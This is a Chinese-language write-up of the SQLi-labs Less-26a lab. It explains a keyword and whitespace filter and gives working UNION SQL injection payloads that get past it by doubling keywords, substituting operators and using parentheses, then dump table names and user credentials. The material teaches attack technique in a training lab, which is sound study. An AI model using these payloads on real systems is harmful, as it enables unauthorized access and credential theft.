# Less-26a （空格+注释全禁 + 括号闭合 + 盲注）

## 查看分析源码

和 Less-26 一样的过滤，但括号闭合 + 无报错：

```php
$id= preg_replace('/or/i',"", $id);        // 去掉 or
$id= preg_replace('/and/i',"", $id);       // 去掉 and
$id= preg_replace('/[\/\*]/',"", $id);     // 去掉 /*
$id= preg_replace('/[--]/',"", $id);       // 去掉 --
$id= preg_replace('/[#]/',"", $id);        // 去掉 #
$id= preg_replace('/[\s]/',"", $id);       // 去掉空格 Tab 换行（\s ×2）
$id= preg_replace('/[\s]/',"", $id);       // 再来一次
$id= preg_replace('/[\/\\]/',"", $id);    // 去掉 / 和 \
```

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
// print_r(mysql_error());       // 没报错
```

和 Less-26 一样的问题：
- or/and 被替换为空 → 双写 oorr / aandnd 或 || / %26%26
- `--` `#` `/*` 全被去掉 → 不能用注释
- `\s` 被去掉 → 空格 Tab 换行全废
- `/` `\` 被去掉 → `/**/` 废了

多了一个括号：`('$id')` 要用 `')` 闭合

空格用 `()` 包裹替代

```
select(1),(2),(3)from(users)where(id='1')
```

## 列数确认

```
?id=-1')union(select(1),(2),(3))||('1')=('1
```

`')` 闭合了括号，`||('1')=('1` 消耗掉原始的 `')`

## 爆库名

```
?id=-1')union(select(1),database(),(3))||('1')=('1
```

## 爆表名

information_schema 里有 or，双写：

```
?id=-1')union(select(1),group_concat(table_name),(3)from(infoorrmation_schema.tables)where(table_schema=database()))||('1')=('1
```

## 爆列名

and 被过滤，用 %26%26 代替：

```
?id=-1')union(select(1),group_concat(column_name),(3)from(infoorrmation_schema.columns)where(table_schema=database()%26%26table_name='users'))||('1')=('1
```

## 爆数据

password 里有 or，双写：

```
?id=-1')union(select(1),group_concat(username),group_concat(passwoorrd)from(users))||('1')=('1
```

比 Less-26 难在没有报错，不能用 updatexml 爆了，全靠 UNION 回显。括号闭合多了一层 `')` 要处理。
